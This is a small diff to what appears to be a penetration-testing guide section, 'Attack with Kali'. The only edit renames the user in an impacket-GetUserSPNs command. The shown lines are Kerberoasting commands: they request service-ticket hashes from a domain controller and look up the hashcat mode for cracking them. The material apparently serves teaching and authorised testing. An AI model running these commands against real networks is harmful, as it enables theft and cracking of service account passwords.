@@ -332,7 +332,7 @@ Attack with Kali
 
 ```bash
 # Get service password hash
-sudo impacket-GetUserSPNs -request -dc-ip 192.168.1.100 example.com/mimi
+sudo impacket-GetUserSPNs -request -dc-ip 192.168.1.100 example.com/user
 
 # crack the TGS-REP hash
 hashcat -hh | grep -E "(Kerberos|TGS-REP)"
